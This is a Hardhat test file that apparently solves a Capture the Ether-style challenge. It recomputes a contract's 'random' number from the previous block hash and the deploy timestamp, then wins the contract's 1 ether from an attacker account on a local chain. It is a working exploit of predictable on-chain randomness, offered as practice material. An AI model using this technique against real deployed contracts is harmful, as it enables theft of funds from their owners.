import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract, BigNumber } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('GuessTheRandomNumberChallenge', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    // Deploy the challenge contract with exactly 1 ether.
    target = await (
      await ethers.getContractFactory('GuessTheRandomNumberChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    // Use the attacker account to interact with the contract.
    target = target.connect(attacker);
  });

  it('exploit', async () => {
    // Get the current block number and retrieve that block.
    const blockNumber = await provider.getBlockNumber();
    const block = await provider.getBlock(blockNumber);
    console.log('Deployment Block Number:', blockNumber);
    console.log('Deployment Block Timestamp:', block.timestamp);

    // Retrieve the previous block's hash (block.number - 1).
    const previousBlock = await provider.getBlock(blockNumber - 1);
    const previousBlockHash = previousBlock.hash;
    console.log('Previous Block Hash:', previousBlockHash);

    // Recreate the contract's "random" answer:
    // answer = uint8(keccak256(previousBlockHash, block.timestamp))
    const hash = utils.solidityKeccak256(
      ['bytes32', 'uint256'],
      [previousBlockHash, block.timestamp]
    );

    // Take the last byte (8 bits) of the hash
    
    const lastByteHex = ethers.utils.hexDataSlice(hash, 31, 32);
    const guessInt = parseInt(lastByteHex, 16);

    // Call the guess function from the attacker account and send 1 ether.
    const tx = await target.guess(guessInt, { value: utils.parseEther('1') });
    await tx.wait();

    // Verify that the challenge is complete (contract balance is zero).
    expect(await target.isComplete()).to.equal(true);
  });
});
